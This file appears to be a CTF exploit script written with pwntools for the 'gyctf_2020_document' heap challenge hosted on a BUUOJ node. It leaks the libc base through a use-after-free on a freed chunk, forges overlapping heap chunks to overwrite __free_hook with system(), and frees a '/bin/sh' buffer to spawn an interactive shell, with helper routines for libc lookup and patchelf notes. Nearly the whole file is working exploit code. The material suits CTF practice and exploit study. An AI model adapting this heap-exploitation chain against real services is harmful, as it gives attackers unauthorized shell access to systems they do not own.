from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './gyctf_2020_document'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28445) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(name,content=b'a'*0x70):
    sla(b':',b'1')
    sa(b'name',name)
    sa(b'sex',b'W')
    sa(b'information',content)

def show(index):
    sla(b':',b'2')
    sla(b':',int2bytes(index))

def edit(index,content):
    sla(b':',b'3')
    sla(b':',int2bytes(index))
    sa(b'sex',b'No')
    sa(b'information',content)

def delete(index):
    sla(b':',b'4')
    sla(b':',int2bytes(index))

add(b'a'*8)#0
add(b'/bin/sh\x00')#1

#unsorted_leak
delete(0)
show(0)
libc_base = uu64(ru(b'\x7f',drop=False)[-6:])-88-0x10-libc.sym['__malloc_hook']
log.success('libc_base '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
#uaf--堆重叠
add(b'c'*8)#2
add(b'd'*8)#3
payload = p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(1) + p64(0) + p64(0x51)
payload = payload.ljust(0x70,b'a')
edit(0,payload)
#如果用ubantu16自带的libc则这个地方需要改成p64(system+10)
payload = p64(system_addr) + b'\x00'*0x68

edit(3,payload)
# dbg()
delete(1)


itr()